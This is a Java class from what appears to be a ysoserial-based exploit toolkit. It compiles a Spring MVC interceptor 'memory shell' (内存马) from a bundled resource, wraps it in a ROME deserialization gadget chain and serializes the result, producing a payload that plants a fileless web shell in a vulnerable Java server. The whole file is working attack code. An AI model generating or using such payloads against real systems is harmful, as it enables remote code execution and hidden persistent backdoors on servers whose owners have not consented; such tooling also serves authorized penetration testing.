package ysoserial.payloads.memshell;

import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

public class SpringInterceptorShell {
    public static void main(final String[] args) throws Exception {
        Object evil = new SpringInterceptorShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        byte[] bytes = ReadWrite.readResource(SpringInterceptorShell.class,"内存马/springmvc/SpringInterceptorShell.java");
        String java = new String(bytes);
        byte[] b = JavaCompiler.compile("SpringInterceptorShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }
}
